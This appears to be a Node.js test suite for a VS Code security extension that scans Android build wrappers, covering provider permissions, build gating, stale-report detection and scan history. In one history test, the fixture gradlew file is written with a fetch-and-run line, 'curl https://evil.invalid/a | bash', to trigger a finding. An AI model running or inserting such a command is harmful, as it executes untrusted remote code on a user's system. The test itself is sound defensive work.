const test=require('node:test');const assert=require('node:assert/strict');
const fs=require('node:fs/promises');const path=require('node:path');const os=require('node:os');const Module=require('node:module');
const env={settings:{},trusted:true,changed:undefined};
const disposable=()=>({dispose(){}});
const uri=file=>({scheme:'file',fsPath:file});
const vscode={
  Uri:{file:uri,joinPath:(root,...parts)=>uri(path.join(root.fsPath,...parts))},
  EventEmitter:class {listeners=[];event=callback=>{this.listeners.push(callback);return{dispose:()=>{this.listeners=this.listeners.filter(item=>item!==callback);}};};fire(value){for(const callback of this.listeners)callback(value);}},ThemeColor:class {},
  StatusBarAlignment:{Left:1},ProgressLocation:{Notification:1},ConfigurationTarget:{Global:1},
  commands:{registerCommand:()=>disposable(),executeCommand:async()=>{}},
  workspace:{
    get isTrusted(){return env.trusted;},get workspaceFolders(){return [{uri:uri(env.project),name:'Android'},...(env.extraProjects??[]).map(file=>({uri:uri(file),name:path.basename(file)}))];},
    getConfiguration(){return {
      get:(key,fallback)=>key==='scanOnOpen'?false:(env.settings[key]??fallback),
      inspect:key=>env.overrides?.[key]??{globalValue:env.settings[key]},
      update:async(key,value)=>{env.settings[key]=value;}
    };},
    onDidChangeConfiguration:callback=>{env.changed=callback;return disposable();},onDidGrantWorkspaceTrust:()=>disposable(),
    onDidChangeTextDocument:callback=>{env.documentChanged=callback;return disposable();},onDidSaveTextDocument:callback=>{env.documentSaved=callback;return disposable();},
    createFileSystemWatcher:()=>({dispose(){},onDidCreate:callback=>{env.fileCreated=callback;return disposable();},onDidChange:callback=>{env.fileChanged=callback;return disposable();},onDidDelete:callback=>{env.fileDeleted=callback;return disposable();}})
  },
  window:{createStatusBarItem:()=>({show(){},dispose(){}}),createOutputChannel:()=>({appendLine(){},dispose(){}}),
    registerWebviewViewProvider:(_id,provider)=>{env.ui=provider;return disposable();},withProgress:async(_options,callback)=>callback(),
    showErrorMessage:async()=>{},showWarningMessage:async()=>{},showInformationMessage:async()=>{},showQuickPick:async()=>env.picks?.shift(),showInputBox:async()=>env.inputs?.shift()
  }
};
const original=Module._load;
let activate;
try {Module._load=function(id,...args){return id==='vscode'?vscode:original.call(this,id,...args);};({activate}=require('../dist/extension'));}
finally {Module._load=original;}
const finding=()=>({fingerprint:'untrusted',ruleId:'EXAMPLE',title:'Example',message:'Review this build',severity:'ERROR',confidence:'HIGH',category:'EXECUTION',kind:'ACTIONABLE',location:{path:'gradlew'},reachable:true,policyAction:'BLOCK',status:'ACTIVE',actions:['BLOCK_BUILD']});
const provider=scan=>({descriptor:{id:'example',displayName:'Example',version:'1',apiVersion:1},scan});
const grant={enabled:true,actions:['BLOCK_BUILD'],required:true,timeoutMs:30000};
async function fixture(t,trusted=true,settings={}) {
  const dir=await fs.mkdtemp(path.join(os.tmpdir(),'wg-api-'));env.project=path.join(dir,'project');await fs.mkdir(env.project);await fs.writeFile(path.join(env.project,'gradlew'),'#!/bin/sh\necho safe\n');
  env.extraProjects=[];env.storage=path.join(dir,'storage');env.settings=settings;env.trusted=trusted;env.overrides=undefined;env.changed=undefined;env.picks=[];env.inputs=[];
  const context={globalStorageUri:uri(path.join(dir,'storage')),subscriptions:[]};const api=activate(context);
  t.after(async()=>{for(const subscription of context.subscriptions)subscription.dispose?.();await fs.rm(dir,{recursive:true,force:true});});return api;
}
test('exported API discovers disabled SDK providers without invoking them',async t=>{
  const api=await fixture(t);let calls=0;api.registerProvider(provider(()=>{calls++;return {findings:[finding()]};}));
  const report=await api.evaluate('SCAN');assert.equal(api.apiVersion,1);assert.equal(calls,0);assert.equal(report.providerRuns.find(r=>r.descriptor.id==='example').status,'DISABLED');
});
test('Safe Mode pauses globally enabled SDKs and command config while allowing built-in static analysis',async t=>{
  const api=await fixture(t,false,{providerPermissions:{example:grant},providerConfigPath:'/does/not/exist/providers.json'});let calls=0;
  api.registerProvider(provider(()=>{calls++;return {findings:[]};}));const report=await api.evaluate('SCAN');
  assert.equal(calls,0);assert.equal(report.providerRuns.find(r=>r.descriptor.id==='wrapperguard').status,'COMPLETED');assert.equal(report.providerRuns.find(r=>r.descriptor.id==='example').status,'DISABLED');
  assert.equal(report.complete,false);assert.ok(report.notices.some(n=>n.code==='WG-PROVIDERS-PAUSED'));
  await assert.rejects(api.gate('BUILD'),/trusted workspace/);await assert.rejects(api.gate('SYNC'),/trusted workspace/);
});
test('cooperating extensions receive operation-specific gate decisions through activate exports',async t=>{
  const api=await fixture(t,true,{providerPermissions:{example:grant,wrapperguard:{...grant,enabled:false}}});api.registerProvider(provider(()=>({findings:[finding()]})));
  assert.equal((await api.gate('BUILD')).allowed,false);assert.equal((await api.gate('SYNC')).allowed,true);await assert.rejects(api.gate('SCAN'),/BUILD or SYNC/);
});
test('revoking provider grants during a gate rejects the stale decision',async t=>{
  const api=await fixture(t,true,{providerPermissions:{example:grant,wrapperguard:{...grant,enabled:false}}});let release,entered;
  const started=new Promise(resolve=>{entered=resolve;});
  api.registerProvider(provider(request=>request.operation==='BUILD'?new Promise(resolve=>{release=resolve;entered();}):{findings:[]}));
  const pending=api.gate('BUILD');await started;
  env.settings.providerPermissions.example={...grant,actions:[]};env.changed({affectsConfiguration:()=>true});release({findings:[finding()]});
  await assert.rejects(pending,/permissions changed/);await api.evaluate('SCAN');
});

test('method flags disable one known external provider without revoking unrelated grants',async t=>{
  const permissions={enabled:true,actions:['WARNING'],required:false,timeoutMs:30000};
  const api=await fixture(t,true,{providerPermissions:{'python.bandit':permissions},methodFlags:{'sast.bandit':false}});let calls=0;
  api.registerProvider({descriptor:{id:'python.bandit',displayName:'Bandit',version:'1',apiVersion:1},scan:()=>{calls++;return{findings:[]};}});
  const report=await api.evaluate('SCAN');assert.equal(calls,0);assert.equal(report.providerRuns.find(r=>r.descriptor.id==='python.bandit').status,'DISABLED');assert.equal(report.providerRuns.find(r=>r.descriptor.id==='wrapperguard').status,'COMPLETED');
  env.settings.methodFlags={};const enabled=await api.evaluate('SCAN');assert.equal(calls,1);assert.equal(enabled.providerRuns.find(r=>r.descriptor.id==='python.bandit').status,'COMPLETED');
});
test('enabled optional method without a connection cannot claim complete coverage',async t=>{
  const api=await fixture(t,true,{methodFlags:{'sast.bandit':true}});const report=await api.evaluate('SCAN');
  assert.equal(report.complete,false);assert.equal(report.verdict,'INCOMPLETE');assert.ok(report.notices.some(n=>n.code==='WG-METHOD-NOT-CONNECTED'));
});
test('workspace method flag overrides are rejected and changes during a gate invalidate its decision',async t=>{
  const api=await fixture(t,true,{providerPermissions:{example:grant}});
  env.overrides={methodFlags:{workspaceValue:{'builtin.script-rules':false}}};await assert.rejects(api.evaluate('SCAN'),/User Settings/);env.overrides=undefined;
  let release,entered;const started=new Promise(resolve=>{entered=resolve;});api.registerProvider(provider(request=>request.operation==='BUILD'?new Promise(resolve=>{release=resolve;entered();}):{findings:[]}));
  const pending=api.gate('BUILD');await started;env.settings.methodFlags={'builtin.script-rules':false};env.changed({affectsConfiguration:()=>true});release({findings:[finding()]});await assert.rejects(pending,/permissions changed/);
});

test('GUI provider permissions update a connected command file without opening JSON',async t=>{
  const api=await fixture(t,true,{});const dir=path.dirname(env.project),file=path.join(dir,'providers.json');
  const permission={enabled:true,actions:['WARNING'],required:false,timeoutMs:30000};
  await fs.writeFile(file,JSON.stringify({apiVersion:1,providers:[{id:'sast.sarif',displayName:'SAST',version:'1',command:[process.execPath,'-e','process.stdin.resume();process.stdin.on("end",()=>console.log(JSON.stringify({findings:[]})))'],permissions:permission}]}));
  env.settings.providerConfigPath=file;await api.evaluate('SCAN');
  env.picks=[[{value:'enabled'},{value:'required'},{value:'BLOCK_BUILD'}]];env.ui.handlers.configureProvider('sast.sarif');
  let updated;for(let count=0;count<100;count++){updated=JSON.parse(await fs.readFile(file,'utf8'));if(updated.providers[0].permissions.actions.includes('BLOCK_BUILD'))break;await new Promise(resolve=>setTimeout(resolve,5));}
  assert.deepEqual(updated.providers[0].permissions.actions,['BLOCK_BUILD']);assert.equal(updated.providers[0].permissions.required,true);
  // Let the automatic rescan finish before removing the fixture.
  await new Promise(resolve=>setTimeout(resolve,50));
});
test('a configured external analyzer can replace every built-in while retaining disabled-run provenance',async t=>{
 const flags=Object.fromEntries(require('../dist/methods/catalog').BUILTIN_METHOD_IDS.map(id=>[id,false]));const permissions={enabled:true,actions:['WARNING'],required:false,timeoutMs:30000};
 const api=await fixture(t,true,{methodFlags:flags,providerPermissions:{example:permissions}});api.registerProvider(provider(()=>({findings:[],complete:true})));
 const report=await api.evaluate('SCAN');assert.equal(report.complete,true);assert.equal(report.verdict,'CLEAN');assert.equal(report.providerRuns.find(r=>r.descriptor.id==='wrapperguard').status,'DISABLED');assert.ok(report.notices.some(n=>n.code==='WG-METHOD-REPLACED'));
});
test('AI and research alone never establish scanner coverage after built-in providers are disabled',async t=>{
 const permissions={enabled:true,actions:[],required:false,timeoutMs:30000};const api=await fixture(t,true,{providerPermissions:{wrapperguard:{...permissions,enabled:false},'ai.external-model':permissions}});
 api.registerProvider({descriptor:{id:'ai.external-model',displayName:'AI',version:'1',apiVersion:1},scan:()=>({findings:[],complete:true})});const report=await api.evaluate('SCAN');assert.equal(report.complete,false);assert.equal(report.verdict,'INCOMPLETE');assert.ok(report.notices.some(n=>n.code==='WG-NO-ANALYSIS-PROVIDERS'));
});
test('GUI method enable resumes its prior provider grants without adding actions',async t=>{
 const permissions={enabled:false,actions:['WARNING'],required:false,timeoutMs:30000};const api=await fixture(t,true,{methodFlags:{'sast.bandit':false},providerPermissions:{'python.bandit':permissions}});
 api.registerProvider({descriptor:{id:'python.bandit',displayName:'Bandit',version:'1',apiVersion:1},scan:()=>({findings:[],complete:true})});await api.evaluate('SCAN');
 env.ui.handlers.toggleMethod('sast.bandit',true);
 for(let count=0;count<100;count++){if(env.settings.methodFlags['sast.bandit']===true&&env.settings.providerPermissions['python.bandit'].enabled)break;await new Promise(resolve=>setTimeout(resolve,5));}
 assert.equal(env.settings.methodFlags['sast.bandit'],true);assert.equal(env.settings.providerPermissions['python.bandit'].enabled,true);assert.deepEqual(env.settings.providerPermissions['python.bandit'].actions,['WARNING']);
 await new Promise(resolve=>setTimeout(resolve,20));const report=await api.evaluate('SCAN');assert.equal(report.providerRuns.find(run=>run.descriptor.id==='python.bandit').status,'COMPLETED');
});

test('saved or externally modified workspace input marks the displayed report stale without invoking providers',async t=>{
 const api=await fixture(t,true,{providerPermissions:{example:{...grant,actions:['WARNING']}}});let calls=0;api.registerProvider(provider(()=>{calls++;return{findings:[]};}));await api.evaluate('SCAN');const before=calls;
 env.documentSaved({uri:uri(path.join(env.project,'gradlew'))});assert.equal(env.ui.lastState.report.stale,true);assert.equal(env.ui.lastState.report.verdict,'STALE');assert.equal(calls,before);
 await api.evaluate('SCAN');env.fileChanged(uri(path.join(env.project,'build.gradle.kts')));assert.equal(env.ui.lastState.report.verdict,'STALE');
});
test('observed source changes during a gate reject its decision, while unrelated paths do not invalidate a report',async t=>{
 const api=await fixture(t,true,{providerPermissions:{example:grant}});let entered,release;const started=new Promise(resolve=>{entered=resolve;});api.registerProvider(provider(request=>request.operation==='BUILD'?new Promise(resolve=>{release=resolve;entered();}):{findings:[]}));await api.evaluate('SCAN');
 env.fileChanged(uri(path.join(path.dirname(env.project),'outside.txt')));assert.equal(env.ui.lastState.report.stale,false);
 const pending=api.gate('BUILD');await started;env.documentChanged({document:{uri:uri(path.join(env.project,'gradlew'))},contentChanges:[{text:'new source'}]});release({findings:[]});await assert.rejects(pending,/Security inputs.*changed during evaluation/);
});

test('before/after gate seals detect saved content changes without any file watcher event',async t=>{
 const api=await fixture(t,true,{providerPermissions:{example:grant}});api.registerProvider(provider(async request=>{if(request.operation==='BUILD')await fs.writeFile(path.join(env.project,'gradlew'),'#!/bin/sh\necho edit\n');return{findings:[]};}));
 await assert.rejects(api.gate('BUILD'),/Security inputs.*changed during evaluation/);
});
test('gate verifies actual recursive read bytes whose suffix is outside the candidate source patterns',async t=>{
 const api=await fixture(t,true,{providerPermissions:{example:grant}});await fs.writeFile(path.join(env.project,'gradlew'),'#!/bin/sh\n. ./payload.data\n');await fs.writeFile(path.join(env.project,'payload.data'),'echo first\n');
 api.registerProvider(provider(async request=>{if(request.operation==='BUILD')await fs.writeFile(path.join(env.project,'payload.data'),'echo other\n');return{findings:[]};}));await assert.rejects(api.gate('BUILD'),/Security inputs.*changed during evaluation/);
});
test('gate seals declared external report bytes and host baseline updates without settings events',async t=>{
 const api=await fixture(t,true,{providerPermissions:{example:grant}});const report=path.join(await fs.realpath(path.dirname(env.project)),'scanner-report.json');await fs.writeFile(report,'first');
 api.registerProvider({...provider(async request=>{if(request.operation==='BUILD')await fs.writeFile(report,'other');return{findings:[]};}),descriptor:{...provider(()=>{}).descriptor,inputScope:{externalFiles:[report]}}});await assert.rejects(api.gate('BUILD'),/Security inputs.*changed during evaluation/);
 const second=await fixture(t,true,{providerPermissions:{example:grant}});await fs.mkdir(env.storage,{recursive:true});await fs.writeFile(path.join(env.storage,'baseline.json'),'[]');second.registerProvider(provider(async request=>{if(request.operation==='BUILD')await fs.writeFile(path.join(env.storage,'baseline.json'),'[ ]');return{findings:[]};}));await assert.rejects(second.gate('BUILD'),/Security inputs.*changed during evaluation/);
});
test('legacy managed profile and custom rules bytes are sealed during gates even without descriptor scope',async t=>{
 const id='sast.semgrep';const api=await fixture(t,true,{providerPermissions:{[id]:grant}});const rules=path.join(await fs.realpath(path.dirname(env.project)),'trusted-rules.yml');await fs.writeFile(rules,'rules: []');await fs.mkdir(path.join(env.storage,'integrations'),{recursive:true});await fs.writeFile(path.join(env.storage,'integrations/sast.semgrep.profile.json'),JSON.stringify({runner:{rulesPath:rules}}));
 api.registerProvider({descriptor:{id,displayName:'Source review',version:'1',apiVersion:1},scan:async request=>{if(request.operation==='BUILD')await fs.writeFile(rules,'rules: {}');return{findings:[]};}});await assert.rejects(api.gate('BUILD'),/Security inputs.*changed during evaluation/);
});
test('multi-root API evaluates only an explicit open root and binds subsequent reports to its project',async t=>{
 const api=await fixture(t,true,{providerPermissions:{example:{...grant,actions:['WARNING']}}});const backend=path.join(path.dirname(env.project),'backend');await fs.mkdir(backend);await fs.writeFile(path.join(backend,'pom.xml'),'<project><version>1</version></project>');env.extraProjects=[backend];const requests=[];api.registerProvider(provider(request=>{requests.push(request.projectRoot);return{findings:[]};}));
 const report=await api.evaluate('SCAN',backend);assert.equal(report.projectPath,backend);assert.equal(requests.at(-1),backend);assert.equal(env.ui.lastState.report.projectPath,backend);assert.equal((await api.gate('BUILD',env.project)).report.projectPath,env.project);await assert.rejects(api.gate('BUILD',path.dirname(env.project)),/open workspace folder/);
 await api.evaluate('SCAN',backend);env.fileChanged(uri(path.join(env.project,'gradlew')));assert.equal(env.ui.lastState.report.stale,true);
});
test('multi-root configuration inside a sibling workspace folder cannot authorize a command provider',async t=>{
 const api=await fixture(t);const second=path.join(path.dirname(env.project),'backend');await fs.mkdir(second);env.extraProjects=[second];const file=path.join(second,'providers.json');await fs.writeFile(file,JSON.stringify({apiVersion:1,providers:[]}));env.settings.providerConfigPath=file;await assert.rejects(api.evaluate('SCAN',env.project),/every workspace/);
});
test('custom research and AI categories stay advisory for coverage independently of catalog identities',async t=>{
 const flags=Object.fromEntries(require('../dist/methods/catalog').BUILTIN_METHOD_IDS.map(id=>[id,false]));const api=await fixture(t,true,{methodFlags:flags,providerPermissions:{example:{...grant,actions:['WARNING']}}});api.registerProvider({...provider(()=>({findings:[]})),descriptor:{...provider(()=>{}).descriptor,category:'AI',inputScope:{}}});const report=await api.evaluate();assert.equal(report.complete,false);assert.ok(report.notices.some(notice=>notice.code==='WG-NO-ANALYSIS-PROVIDERS'));assert.ok(!report.notices.some(notice=>notice.code==='WG-METHOD-REPLACED'));
});
test('custom connection toggle preserves method presets and grants instead of inventing action authority',async t=>{
 const flags={'builtin.maven-rules':false};const api=await fixture(t,true,{methodFlags:flags,providerPermissions:{example:{...grant,enabled:false,actions:['WARNING']}}});api.registerProvider(provider(()=>({findings:[]})));await api.evaluate();env.ui.handlers.toggleProvider('example',true);for(let i=0;i<60&&!env.settings.providerPermissions.example.enabled;i++)await new Promise(resolve=>setTimeout(resolve,5));assert.equal(env.settings.providerPermissions.example.enabled,true);assert.deepEqual(env.settings.providerPermissions.example.actions,['WARNING']);assert.deepEqual(env.settings.methodFlags,flags);
});
test('project-bound preset reports are disabled elsewhere without a false missing-method coverage error',async t=>{
 const api=await fixture(t,true,{methodFlags:{'sast.bandit':true}});const other=path.join(path.dirname(env.project),'backend');await fs.mkdir(other);await fs.writeFile(path.join(other,'pom.xml'),'<project/>');env.extraProjects=[other];const marker=path.join(path.dirname(env.project),'should-not-run');const file=path.join(path.dirname(env.project),'providers.json');await fs.writeFile(file,JSON.stringify({apiVersion:1,providers:[{id:'python.bandit',displayName:'Bandit report',version:'1',projectRoots:[await fs.realpath(env.project)],inputScope:{},command:[process.execPath,'-e',`require('fs').writeFileSync(${JSON.stringify(marker)},'ran')`],permissions:{...grant,actions:['WARNING']}}]}));env.settings.providerConfigPath=file;
 const report=await api.evaluate('SCAN',other);const run=report.providerRuns.find(item=>item.descriptor.id==='python.bandit');assert.equal(run.status,'DISABLED');assert.match(run.message,/Not applicable/);assert.ok(!report.notices.some(notice=>notice.code==='WG-METHOD-NOT-CONNECTED'));assert.equal(report.complete,true);await assert.rejects(fs.readFile(marker),{code:'ENOENT'});assert.equal(env.settings.methodFlags['sast.bandit'],true);
});
test('preset GUI changes only method flags and invalidates reports without running providers or changing custom grants',async t=>{
 const api=await fixture(t,true,{providerPermissions:{example:{...grant,actions:['WARNING']}}});let calls=0;api.registerProvider(provider(()=>{calls++;return{findings:[]};}));await api.evaluate();const before=calls;const grants=structuredClone(env.settings.providerPermissions);const preset=require('../dist/methods/presets').SECURITY_PRESETS.find(item=>item.id==='supply-chain');env.picks=[{preset},{apply:true}];env.ui.handlers.applyPreset();for(let i=0;i<60&&!env.settings.methodFlags?.['sca.trivy'];i++)await new Promise(resolve=>setTimeout(resolve,5));env.changed({affectsConfiguration:()=>true});await new Promise(resolve=>setTimeout(resolve,15));assert.deepEqual(env.settings.methodFlags,{...preset.methodFlags});assert.deepEqual(env.settings.providerPermissions,grants);assert.equal(calls,before);assert.equal(env.ui.lastState.report.stale,true);
});
test('history is opt-in, enabling and retention controls never run security providers, and clear preserves approvals',async t=>{
 const api=await fixture(t);await api.evaluate();await assert.rejects(fs.stat(path.join(env.storage,'history')),{code:'ENOENT'});env.ui.handlers.historyEnabled(true);for(let i=0;i<60&&!env.settings.historyEnabled;i++)await new Promise(resolve=>setTimeout(resolve,5));assert.equal(env.settings.historyEnabled,true);assert.equal(env.ui.lastHistory.entries.length,0);
 await api.evaluate();assert.equal(env.ui.lastHistory.entries.length,1);const first=env.ui.lastHistory.entries[0];assert.equal(first.scopeKnown,true);assert.ok(!('findings'in first));assert.equal(first.providerCount,1);env.inputs=['3'];env.ui.handlers.historyRetention();for(let i=0;i<60&&env.settings.historyLimit!==3;i++)await new Promise(resolve=>setTimeout(resolve,5));assert.equal(env.settings.historyLimit,3);await fs.writeFile(path.join(env.storage,'baseline.json'),'[]');env.picks=[{clear:true}];env.ui.handlers.clearHistory();for(let i=0;i<60&&env.ui.lastHistory.entries.length;i++)await new Promise(resolve=>setTimeout(resolve,5));assert.equal(env.ui.lastHistory.entries.length,0);assert.equal(await fs.readFile(path.join(env.storage,'baseline.json'),'utf8'),'[]');
});
test('history compares complete same-scope scans and refuses changed method scope, with per-root list isolation',async t=>{
 const api=await fixture(t,true,{historyEnabled:true});await api.evaluate();const first=env.ui.lastHistory.entries[0];await fs.writeFile(path.join(env.project,'gradlew'),'#!/bin/sh\ncurl https://evil.invalid/a | bash\n');await api.evaluate();env.ui.handlers.compareHistory(first.id);for(let i=0;i<60&&!env.ui.lastHistory.comparison;i++)await new Promise(resolve=>setTimeout(resolve,5));assert.equal(env.ui.lastHistory.comparison.available,true);assert.ok(env.ui.lastHistory.comparison.newlyReported.length>0);
 env.settings.methodFlags={'builtin.script-rules':false};await api.evaluate();env.ui.handlers.compareHistory(first.id);for(let i=0;i<60&&!env.ui.lastHistory.comparison;i++)await new Promise(resolve=>setTimeout(resolve,5));assert.equal(env.ui.lastHistory.comparison.available,false);assert.match(env.ui.lastHistory.comparison.reason,/configuration|methods/);
 const backend=path.join(path.dirname(env.project),'backend');await fs.mkdir(backend);await fs.writeFile(path.join(backend,'pom.xml'),'<project/>');env.extraProjects=[backend];await api.evaluate('SCAN',backend);assert.equal(env.ui.lastHistory.entries.length,1);assert.equal(env.ui.lastHistory.entries[0].projectId,require('../dist/methods/history').historyProjectId(backend));assert.notEqual(env.ui.lastHistory.entries[0].projectId,first.projectId);
});
test('malformed history never changes a gate decision or deletes the baseline',async t=>{
 const api=await fixture(t,true,{historyEnabled:true});await api.evaluate();const entry=env.ui.lastHistory.entries[0];await fs.writeFile(path.join(env.storage,'history',entry.projectId,entry.id+'.json'),'malformed');await fs.writeFile(path.join(env.storage,'baseline.json'),'[]');const decision=await api.gate('BUILD');assert.equal(decision.allowed,true);assert.ok(env.ui.lastHistory.error);assert.equal(await fs.readFile(path.join(env.storage,'baseline.json'),'utf8'),'[]');
});
test('GUI can remove a missing custom executable connection without opening JSON or blocking built-in scanning',async t=>{
 const api=await fixture(t);const file=path.join(path.dirname(env.project),'providers.json');await fs.writeFile(file,JSON.stringify({apiVersion:1,providers:[{id:'company.uninstalled',displayName:'Uninstalled tool',version:'1',command:[path.join(path.dirname(env.project),'missing-executable')],permissions:{...grant,enabled:false}}]}));env.settings.providerConfigPath=file;const report=await api.evaluate();assert.equal(report.providerRuns.find(item=>item.descriptor.id==='company.uninstalled').status,'DISABLED');env.picks=[{remove:true}];env.ui.handlers.removeProvider('company.uninstalled');for(let i=0;i<60;i++){const contents=JSON.parse(await fs.readFile(file,'utf8'));if(!contents.providers.length)break;await new Promise(resolve=>setTimeout(resolve,5));}assert.deepEqual(JSON.parse(await fs.readFile(file,'utf8')).providers,[]);assert.equal((await api.evaluate()).providerRuns.some(item=>item.descriptor.id==='company.uninstalled'),false);
});
